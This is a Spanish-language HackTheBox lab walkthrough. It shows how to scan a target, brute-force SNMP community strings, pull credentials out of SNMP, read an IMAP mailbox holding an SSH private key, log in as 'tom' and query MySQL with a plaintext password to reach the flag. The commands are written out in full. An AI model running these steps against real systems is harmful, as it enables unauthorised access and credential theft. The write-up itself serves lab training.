# Práctica Final: Difícil 🐧3️⃣


1. Primero tenemos que saber que **puertos** de la máquina objetivo están expuestos.

```sql
nmap -p- -sS -Pn -n <IP> -oG ports
```

![Puertos.PNG](./assets/Dificil/01-Puertos.png)

---

2. En el enunciado de **HackTheBox** nos dicen que debemos auditar un **servidor de correos (MX)**, pero, necesitamos de credenciales y no las tenemos aún.

---

3. Enumeramos los puertos por **UDP**.

```sql
nmap -p- -sU <IP> -oG ports_udp
```

![Puertos-UDP.PNG](./assets/Dificil/02-Puertos-UDP.png)

- Vemos que el **servicio SNMP** está disponible.

---

4. Enumeramos **“String Communities”** del servicio

```sql
onesixtyone -c /usr/share/wordlists/seclists/Discovery/SNMP/snmp.txt <IP>
```

![String.PNG](./assets/Dificil/03-String.png)

- Vemos que **“backup”** es una **“String Community”** válida.

---

5. Usaremos **snmpwalk** y la **string community ‘backup’** para enumerar el servicio **SNMP**

```sql
snmpwalk -v2c -c backup <IP>
```

![SNMP.PNG](./assets/Dificil/04-SNMP.png)

- Tenemos credenciales las cuales podremos usar para **autenticarnos** en el servidor de correo.

---

6. Usaremos **openssl** y las credenciales anteriores para autenticarnos.

```sql
openssl s_client -connect <IP>:imaps
```

- **Comando para autenticarse: `A LOGIN "user" "password"`**

---

7. Ahora listamos todos los ***buzones de correo** del usuario **tom**

```sql
A LIST ""
```

![Listar.PNG](./assets/Dificil/05-Listar.png)

Verificamos si existen mensajes en todos los **buzones** (`A SELECT <CARPETA>`) y vemos que **en INBOX** si hay

![Inbox.PNG](./assets/Dificil/06-Inbox.png)

---

8. Vemos el contenido del correo **`A FETCH 1 BODY[]`**

![id_rsa.PNG](./assets/Dificil/07-id_rsa.png)

- Conseguimos una **clave id_rsa,** la cual trataremos de usar para **autenticarnos por SSH**

```python
✅ Debemos asignarle el permiso 600 a la clave id_rsa para que el servicio SSH no de problemas al intentar autenticarnos.
```

---

9. Nos autenticamos con la **clave id_rsa** encontrada

```bash
ssh tom@<IP> -i id_rsa
```

![ssh.PNG](./assets/Dificil/08-ssh.png)

---

10. Inspeccionamos los servicios que la **máquina tiene localmente `netstat -nat`**

![netstat.pNG](./assets/Dificil/09-netstat.png))

- **MySQL** se ejecuta por default en el **puerto 3306**

---

11.  Accedemos a **MySQL**

```sql
mysql -u "tom" -p'NMds732Js2761'
```

---

12. Ahora solo nos queda inspeccionar **MySQL**
- Mostramos las **todas bases de datos** de MySQL `SHOW DATABASES;`

![sql1.PNG](./assets/Dificil/10-sql1.png)

- Usaremos la base de datos **‘users’ `USE users;`** y mostramos las tablas que existen **`SHOW TABLES;`**

![sql2.PNG](./assets/Dificil/11-sql2.png)

- Vemos que campos tiene la **tabla ‘users’ `DESCRIBE users`**

![sql3.PNG](./assets/Dificil/12-sql3.png)

- Buscamos el registro que tenga por nombre **HTB `SELECT * FROM users WHERE username='HTB'`**

![Bandera.PNG](./assets/Dificil/13-Bandera.png)